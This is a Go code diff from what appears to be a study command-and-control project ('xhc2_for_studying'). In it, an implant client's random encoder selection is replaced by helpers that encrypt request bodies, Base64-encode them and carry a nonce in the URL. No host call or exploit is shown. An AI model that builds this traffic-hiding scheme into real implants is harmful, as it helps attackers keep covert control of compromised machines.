@@ -1,57 +1,37 @@
 package client
 
 import (
-	"fmt"
-	"math/rand/v2"
+	"encoding/base64"
 
 	"xhc2_for_studying/protocol"
 )
 
-// pickEncoder 随机选择一个已注册的编码器，返回其 ID 和实例。
-func pickEncoder() (int, protocol.Encoder, error) {
-	// 模拟：随机选 Plain(0) 或 Base64(1)
-	id := rand.IntN(2)
-	enc, ok := protocol.GetEncoderByID(id)
-	if !ok {
-		return 0, nil, fmt.Errorf("encoder %d not found", id)
-	}
-	return id, enc, nil
-}
-
-// encodeBody 用 encoderID 对应的编码器编码请求体。
-func encodeBody(data []byte, encoderID int) ([]byte, error) {
-	enc, ok := protocol.GetEncoderByID(encoderID)
-	if !ok {
-		return nil, fmt.Errorf("encoder %d not found", encoderID)
-	}
-	return enc.Encode(data)
-}
-
-// decodeBody 用 encoderID 对应的编码器解码响应体。
-func decodeBody(data []byte, encoderID int) ([]byte, error) {
-	enc, ok := protocol.GetEncoderByID(encoderID)
-	if !ok {
-		return nil, fmt.Errorf("encoder %d not found", encoderID)
-	}
-	return enc.Decode(data)
-}
-
-// RequestContext 封装一次请求的 nonce 和 encoder 信息。
-// Implant 用它编码请求、解码响应；Server 端从 nonce 还原出同样的 encoder。
-type RequestContext struct {
-	Nonce     int
-	EncoderID int
-}
-
-// NewRequestContext 生成一个新的请求上下文：随机选 encoder，生成对应的 nonce。
-func NewRequestContext(modulus int) *RequestContext {
-	encoderID, _, err := pickEncoder()
+// encryptAndEncode 加密明文并 Base64 编码。
+// 返回: encodedBody, nonceBase64（用于放 URL）, error。
+func (c *Client) encryptAndEncode(plaintext []byte) (encodedBody []byte, nonceB64 string, err error) {
+	packet, nonceB64, err := c.cipherCtx.Encrypt(plaintext)
 	if err != nil {
-		// 兜底：用 Plain
-		encoderID = 0
+		return nil, "", err
 	}
-	return &RequestContext{
-		Nonce:     protocol.GenerateNonce(encoderID, modulus),
-		EncoderID: encoderID,
-	}
+	encoded := make([]byte, base64.StdEncoding.EncodedLen(len(packet)))
+	base64.StdEncoding.Encode(encoded, packet)
+	return encoded, nonceB64, nil
 }
+
+// decodeAndDecrypt 解码 Base64 响应并解密。
+func (c *Client) decodeAndDecrypt(data []byte) ([]byte, error) {
+	decoded := make([]byte, base64.StdEncoding.DecodedLen(len(data)))
+	n, err := base64.StdEncoding.Decode(decoded, data)
+	if err != nil {
+		return nil, err
+	}
+	return c.cipherCtx.Decrypt(decoded[:n])
+}
+
+// encryptAndEncodeBody 等价于 encryptAndEncode，供包内使用。
+func (c *Client) encryptAndEncodeBody(plaintext []byte) (body []byte, nonceB64 string, err error) {
+	return c.encryptAndEncode(plaintext)
+}
+
+// ensure 编译期检查 Encoder 注册。
+var _ = protocol.NonceSize // 确保 protocol 包被正确引用
